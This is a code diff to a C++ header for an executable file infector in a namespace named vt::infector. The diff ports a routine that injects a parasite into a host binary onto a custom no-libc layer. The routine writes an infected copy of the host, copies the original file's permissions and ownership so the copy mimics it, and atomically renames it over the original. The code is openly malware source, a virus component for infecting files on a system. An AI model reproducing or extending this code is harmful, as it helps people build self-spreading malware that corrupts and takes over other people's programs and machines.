@@ -1,7 +1,10 @@
 #pragma once
+#include <linux/limits.h>
+#include <stdlib.h>
 #include "common/file_descriptor.hh"
 #include "common/mmap.hh"
-#include "std/string.hh"
+#include "nostdlib/stdio.hh"
+#include "nostdlib/string.hh"
 
 namespace vt::infector {
 // A generic infection routine, that can be used by any algorithms.
@@ -26,7 +29,7 @@ bool infect(const char* host_path, const char* parasite_path) {
 
   char tmp[PATH_MAX];
   auto len = strlen(host_path);
-  strcpy(tmp, host_path);
+  vt::strcpy(tmp, host_path);
   tmp[len] = '.';
   tmp[len + 1] = '\0';
 
@@ -36,14 +39,14 @@ bool infect(const char* host_path, const char* parasite_path) {
     return false;
   }
   auto output_size = Infect::output_size(host_size, parasite_mapping.size());
-  ftruncate(output.handle(), output_size);
+  vt::ftruncate(output.handle(), output_size);
 
   common::Mmap<PROT_READ | PROT_WRITE> output_host_mapping(
       output_size, MAP_SHARED, output.handle(), 0);
 
   // Make a writable copy of the host.
-  memcpy(output_host_mapping.mutable_base(), host_mapping.base(),
-         host_mapping.size());
+  vt::memcpy(output_host_mapping.mutable_base(), host_mapping.base(),
+             host_mapping.size());
 
   Infect infector;
   if (!infector(vt::move(output_host_mapping), vt::move(parasite_mapping))) {
@@ -52,17 +55,17 @@ bool infect(const char* host_path, const char* parasite_path) {
 
   // mimic the original file.
   struct stat s;
-  if (fstat(host.handle(), &s) < 0) {
+  if (vt::fstat(host.handle(), &s) < 0) {
     return false;
   }
-  if (fchmod(output.handle(), s.st_mode) < 0) {
+  if (vt::fchmod(output.handle(), s.st_mode) < 0) {
     return false;
   }
-  if (fchown(output.handle(), s.st_uid, s.st_gid) < 0) {
+  if (vt::fchown(output.handle(), s.st_uid, s.st_gid) < 0) {
     return false;
   }
   // atomic swap and replace the orignal host with our infected one.
-  if (rename(tmp, host_path) < 0) {
+  if (vt::rename(tmp, host_path) < 0) {
     return false;
   }
   return true;
